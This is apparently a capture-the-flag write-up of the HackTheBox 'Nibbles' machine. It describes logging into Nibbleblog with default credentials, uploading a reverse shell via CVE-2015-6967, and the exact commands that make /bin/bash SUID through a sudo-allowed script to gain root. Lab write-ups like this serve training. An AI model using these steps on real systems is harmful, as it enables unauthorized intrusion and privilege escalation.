## Initial NMAP scan:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Nibbles]
└─$ nmap 10.129.96.84 -T4 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-19 11:54 +0545
Nmap scan report for 10.129.96.84
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 24.33 seconds
```

## Enemurating Port 80:

Opening the site, there's a comment giving us hint as `/nibbleblog/ directory`

Visiting, `/nibbleblog/` directory, we can confirm it's using nibble blog CMS. after searching for exploits, we can find CVE-2015-6967 which is authenticated RCE.
Trying to login with default credentials `admin:nibbles`, we can login to the CMS successfully.

After reviewing the ExploitDB code, The exploit is simple, after getting loggedin we can go to My image plugin then upload our reverse shell which can be triggered from `/nibbleblog/content/private/plugins/my_image/image.php` which leads us to our shell as `nibbler`.

## Privilege Escalation:

```bash
nibbler@Nibbles:/$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
We can run monitor.sh as root which is under our own home directory which means we can change the content of the file to anything we want and run it as root.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "#\!/bin/bash">monitor.sh

nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "chmod u+s /bin/bash">>monitor.sh

nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash

/bin/bash -p
bash-4.3# whoami
root

bash-4.3# cat /root/root.txt
29eb7836ff4369ff4e7c6089235a02e4
```

# Takeaways:
- Don't underestimate the power of weak credentials, generate your custom wordlist and try to bruteforce.